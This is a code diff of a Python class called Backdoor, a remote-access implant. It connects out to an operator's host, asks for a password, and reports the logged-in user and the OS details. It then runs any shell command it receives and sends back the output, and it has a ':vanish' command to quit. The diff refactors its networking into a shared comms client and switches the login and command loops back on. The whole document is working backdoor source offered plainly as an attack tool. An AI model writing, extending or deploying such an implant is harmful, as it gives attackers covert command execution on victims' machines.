@@ -3,24 +3,14 @@ import subprocess
 import time
 import os
 import base64
+import src.shared.comms
 
 class Backdoor(object):
     def __init__(self, host, port, passwd):
         self.__host = host
-        self.__port = port
+        self.__comms = src.shared.comms.Client(host, port)
         self.__passwd = passwd
         self.__next_msg = list()
-        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    def __encode(self, data):
-        encoded = data.encode()
-        encoded = base64.b64encode(encoded)
-        return encoded
-
-    def __decode(self, data):
-        decoded = base64.b64decode(data)
-        decoded = decoded.decode()
-        return decoded
 
     def __msg(self, msg):
         self.__next_msg.append(msg)
@@ -28,14 +18,10 @@ class Backdoor(object):
     def __send(self):
         msg = '\n'.join(self.__next_msg)
         self.__next_msg.clear()
-        self.__sock.send(self.__encode(msg))
+        self.__comms.send(msg)
 
     def __recv(self):
-        return self.__decode(self.__sock.recv(1024))
-
-    def __send_and_recv(self):
-        self.__send()
-        return self.__recv()
+        return self.__comms.recv()
 
     def __execute_code(self, code):
         proc = subprocess.Popen(
@@ -55,7 +41,8 @@ class Backdoor(object):
     def login_loop(self):
         while True:
             self.__msg('Login: ')
-            passwd = self.__send_and_recv()
+            self.__send()
+            passwd = self.__recv().decode()
             if self.__passwd == passwd:
                 remote_login = self.__execute_code('whoami').strip()
                 remote_os = self.__execute_code('uname -a').strip()
@@ -75,7 +62,8 @@ class Backdoor(object):
     def cmd_loop(self):
         while True:
             self.__msg('#>')
-            data = self.__send_and_recv()
+            self.__send()
+            data = self.__recv().decode()
 
             if data == ':vanish':
                 self.__msg('Slave Vanishing...')
@@ -85,20 +73,11 @@ class Backdoor(object):
             out = self.__execute_code(data)
             self.__msg(out)
 
-    def test_loop(self):
-        while True:
-            data = self.__sock.recv(1024)
-            self.__msg('ok')
-            self.__send()
-            print(data)
-
     def open(self):
-        self.__sock.connect((self.__host, self.__port))
-        #if not self.login_loop():
-        #    return
-        
-        self.test_loop()
-        #self.cmd_loop()
+        self.__comms.connect()
+        if not self.login_loop():
+            return
+        self.cmd_loop()
 
 
 if __name__ == '__main__':
